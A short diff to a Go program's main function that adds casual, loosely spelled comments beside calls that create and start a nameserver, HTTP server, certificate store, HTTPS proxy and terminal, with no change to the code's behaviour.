@@ -139,10 +139,10 @@ func main() {
 		}
 	}
 
-	ns, _ := core.NewNameserver(cfg)
-	ns.Start()
-	hs, _ := core.NewHttpServer()
-	hs.Start()
+	ns, _ := core.NewNameserver(cfg)   //dd initate object
+	ns.Start()                          // call its method of start
+	hs, _ := core.NewHttpServer()  //same
+	hs.Start()   //same
 
 	crt_db, err := core.NewCertDb(crt_path, cfg, ns, hs)
 	if err != nil {
@@ -150,8 +150,8 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode)
-	hp.Start()
+	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode)   //same
+	hp.Start()  //same
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
 	if err != nil {
